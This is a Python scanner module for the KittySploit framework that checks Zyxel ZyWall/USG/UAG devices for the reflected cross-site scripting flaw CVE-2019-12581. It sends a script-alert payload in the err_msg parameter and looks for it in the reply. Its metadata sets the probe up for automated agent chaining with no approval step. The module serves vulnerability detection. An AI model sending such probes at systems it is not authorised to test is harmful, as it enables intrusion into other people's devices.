#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject arbitrary web script or HTML via the err_m."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting Detection',
        'description': 'Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject arbitrary web script or HTML via the err_msg parameter free_time_failed.cgi CGI program, aka reflective cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'zyxel', 'zywall', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zyxel.com/support/vulnerabilities-related-to-the-Free-Time-feature.shtml',
            'https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-in-zxel-zywall/',
            'https://n-thumann.de/blog/zyxel-gateways-missing-access-control-in-account-generator-xss/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-12581',
            'https://www.zyxel.com/us/en/',
        ],
        'cve': 'CVE-2019-12581',
    }

    def run(self):
        r = self.http_request(method="GET", path='/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain);</script>', 'Please contact with administrator.',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting detected",
                path='/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>',
            )
            return True
        return False

